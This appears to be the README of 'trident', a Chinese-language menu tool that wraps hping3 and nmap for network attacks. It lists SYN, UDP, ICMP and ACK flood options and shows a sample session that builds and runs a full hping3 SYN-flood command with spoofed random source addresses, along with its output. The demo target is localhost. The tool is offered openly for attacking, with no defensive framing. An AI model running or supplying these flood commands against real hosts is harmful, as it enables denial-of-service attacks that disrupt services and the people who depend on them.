# trident

confront the tough with toughness go away forever

---

当前菜单: 首页 

1: HPING3攻击  2: NMAP扫描

3: 设置        

q: 退出  b: 返回  0: 首页  s: 设置

请输入命令号: 


---

当前菜单: HPING3攻击 

1: SYN Flood   2: UDP Flood

3: ICMP Flood  4: ACK Flood

q: 退出  b: 返回  0: 首页  s: 设置

请输入命令号: 1
目标 IP: 127.0.0.1
数据包大小(默认120): 
持续时间(秒，默认60): 
目标端口(默认80): 
攻击类型: SYN
目标: 127.0.0.1:80
命令: hping3 -c 60000 -d 120 -S -p 80 --flood --rand-source 127.0.0.1


按任意键继续...(退出 Ctrl+C)
开始执行攻击...

[ | ] 正在执行攻击...HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 120 data bytes
hping in flood mode, no replies will be shown
[ | ] 正在执行攻击...